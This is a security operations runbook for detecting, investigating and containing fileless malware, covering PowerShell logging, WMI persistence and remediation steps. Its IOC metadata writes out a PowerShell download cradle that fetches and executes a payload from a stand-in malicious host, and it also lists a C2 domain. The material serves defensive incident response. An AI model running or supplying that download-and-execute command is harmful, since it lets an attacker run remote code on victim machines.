Title: Fileless Malware Detection and Response
Severity: Critical
MITRE ATT&CK: T1027, T1059, T1204
Version: 1.0
Last Updated: 15-Nov-2025
Author: Security Operations Team
Environment: Endpoints, Memory, Registry
Tools: EDR, SIEM, Memory Forensics, PowerShell Logging, Sysmon
DETECTION:

PowerShell executing encoded or obfuscated commands
WMI persistence without file artifacts
Registry-only persistence mechanisms
Scripts executing directly from memory
Malicious macros spawning PowerShell/WScript
Scheduled tasks running scriptlets without files
LOLBins downloading and executing payloads in memory
Empire, Metasploit, or Cobalt Strike beacon indicators

INVESTIGATION:

Check PowerShell logs (Event ID 4104):

Script block logging for executed commands
Encoded or obfuscated PowerShell
Download cradles (IEX, Invoke-WebRequest)
Commands executed and their output


Review EDR memory analysis:

Processes with suspicious in-memory code
Script interpreters with unusual behavior
Memory-resident payloads or shellcode
C2 beaconing from script interpreters


Analyze persistence mechanisms:

WMI event subscriptions
Registry autoruns (Run keys with scriptlets)
Scheduled tasks with inline scripts
No file on disk for persistence


Check for lateral movement:

WMI or PSRemoting used for spreading
Additional systems with similar indicators
Credential theft enabling further access



IMMEDIATE ACTIONS:

Isolate infected endpoint immediately
Kill malicious script interpreter processes
Remove WMI event subscriptions and persistence
Block C2 domains/IPs identified

CONTAINMENT:

Delete registry-based persistence mechanisms
Remove malicious scheduled tasks
Clear WMI repository if heavily compromised
Check all endpoints for similar fileless indicators
Implement PowerShell constrained language mode
Enable Script Block Logging and Module Logging
Follow Credential Dumping Runbook if LSASS accessed

POST-INCIDENT:

Analyze PowerShell logs for complete attack timeline
Document fileless techniques and C2 infrastructure
Update EDR rules for fileless malware detection
Monitor for 30 days for memory-resident threats
Share IOCs and TTPs with threat intelligence

LESSONS LEARNED:

Enable comprehensive PowerShell logging (Script Block, Module, Transcription)
Implement PowerShell Constrained Language Mode
Application whitelisting for script interpreters
Memory scanning and behavioral EDR detection
Disable WMI if not required for business operations
Monitor for suspicious use of LOLBins and script interpreters
Regular memory forensics training for IR team
Attack surface reduction rules in Microsoft Defender

METADATA:
json{
  "related_runbooks": "Suspicious Powershell Runbook, Living Off The Land Runbook, Reflective DLL Injection Runbook",
  "ioc": [
    {
      "Type": "powershell_command",
      "Value": "IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload')",
      "Action": "blocked",
      "duration_in_days": 365,
      "ckc_stage": "execution"
    },
    {
      "Type": "domain",
      "Value": "fileless-c2.com",
      "Action": "blocked",
      "duration_in_days": 365,
      "ckc_stage": "command_and_control"
    }
  ]
}